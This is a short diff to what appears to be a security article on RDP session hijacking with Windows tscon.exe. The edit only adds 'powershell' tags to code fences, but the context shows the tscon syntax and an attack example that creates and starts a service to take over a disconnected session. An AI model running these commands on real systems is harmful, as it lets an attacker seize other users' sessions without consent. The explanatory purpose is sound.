@@ -10,7 +10,7 @@ Let’s focus on the RDP hijacking technique leveraging the [Tscon.exe](https://
 
 The syntax for the command is simple:
 
-```
+```powershell
 tscon {<SessionID> | <SessionName>} [/dest:<SessionName>] [/password:<pw> | /password:*] [/v]
 ```
 
@@ -20,7 +20,7 @@ The simplest example would be `tscon 2`.
 
 to resume a previously disconnected RDP session an attacker with system-level access can setup a service with this syntax:
 
-```
+```powershell
 sc create hijackedsession binpath= “cmd.exe /k tscon 1 /dest:rdp-tcp#2”
 net start hijackedsession
 
